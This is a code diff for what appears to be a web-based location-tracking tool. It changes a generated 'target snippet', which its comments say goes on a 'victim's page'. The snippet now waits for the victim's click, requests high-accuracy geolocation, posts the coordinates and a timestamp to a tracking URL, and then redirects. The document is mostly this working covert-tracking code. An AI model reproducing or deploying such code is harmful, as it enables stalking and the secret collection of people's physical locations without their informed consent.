@@ -60,11 +60,11 @@ document.getElementById('registerBtn').addEventListener('click', function(){
     var el = document.getElementById('registerResult');
     var url = (location.origin || '') + j.url;
 
-    // Build a target snippet that requests geolocation on the victim's page and POSTs it to the tracking endpoint
-    var geoTargetSnippet = '<script>\n(function(){\n  var url = ' + JSON.stringify(url) + ';\n  if(navigator.geolocation){\n    navigator.geolocation.getCurrentPosition(function(p){\n      try{\n        fetch(url, {\n          method: "POST",\n          headers: { "Content-Type": "application/json" },\n          body: JSON.stringify({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy })\n        });\n      }catch(e){console.error(e);}\n    }, function(e){ console.error('geolocation error', e); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });\n  }\n})();\n<\/script>';
+    // Victim-click snippet: asks for geolocation when the victim clicks the link, then POSTs it and navigates to the target URL.
+    var geoTargetSnippet = '<a id="geoTrack" href="' + url + '">Open target</a><script>document.getElementById("geoTrack").addEventListener("click", function(e){ e.preventDefault(); var target = this.href; if (!navigator.geolocation) { window.location = target; return; } navigator.geolocation.getCurrentPosition(function(p){ fetch(target, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, ts: Date.now() }) }).catch(function(){}); window.location = target; }, function(){ window.location = target; }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }); });<\/script>';
 
     el.style.display = 'block';
-    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n') + '\n\nTarget snippet (with geolocation):\n' + geoTargetSnippet.replace(/\\n/g,'\n');
+    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n') + '\n\nTarget snippet (click triggers geolocation):\n' + geoTargetSnippet.replace(/\\n/g,'\n');
     btn.disabled = false;
     btn.textContent = 'Create tracking token';
   }).catch(function(err){
@@ -94,7 +94,6 @@ document.getElementById('geoBtn').addEventListener('click', function(){
     var lon = p.coords.longitude;
     var acc = p.coords.accuracy;
 
-    // Build a user-friendly maps link
     var mapsLink = 'https://www.google.com/maps?q=' + encodeURIComponent(lat + ',' + lon);
 
     var out = '';
@@ -103,7 +102,6 @@ document.getElementById('geoBtn').addEventListener('click', function(){
     out += 'Longitude: ' + lon + '\n';
     out += 'Accuracy: within ' + acc + ' meters.\n';
 
-    // Show result on the page; also log to console like the original snippet
     resultEl.style.display = 'block';
     resultEl.innerHTML = out + '\n(JSON): ' + JSON.stringify({latitude: lat, longitude: lon, accuracy: acc}, null, 2);
 
